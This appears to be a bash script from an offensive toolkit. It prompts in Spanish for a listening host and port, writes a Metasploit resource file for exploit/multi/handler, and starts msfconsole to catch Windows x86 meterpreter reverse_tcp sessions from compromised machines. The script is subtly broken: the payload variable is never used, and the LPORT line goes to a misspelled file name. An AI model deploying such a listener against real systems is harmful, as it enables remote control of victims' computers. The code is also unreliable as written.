#! /bin/bash
RS="\e[1;31m"
CE="\e[0m"
echo -e "$RS BIENVENIDO AL LISTENER X86 $CE"
echo -e ""
echo -e ""
echo -e "$RS Introduzca el LHOST: $CE"
read -e IP1
echo -e "$RS Introduzca el LPORT: $CE"
read -e LPORT1
payload1="payload/windows/x86/meterpreter/reverse_tcp"
echo "use exploit/multi/handler" > "/root/kuze_scan/rc/windowx86".rc
echo "set LHOST $IP1" >> "/root/kuze_scan/rc/windowx86".rc
echo "set LPORT $LPORT1" >> "/root/kuze_scan/rc/windowsx86".rc
echo "set ExitOnSession false" >> "/root/kuze_scan/rc/windowx86".rc
echo "exploit -j" >> "/root/kuze_scan/rc/windowx86".rc
clear
msfconsole -r "/root/kuze_scan/rc/windowx86".rc
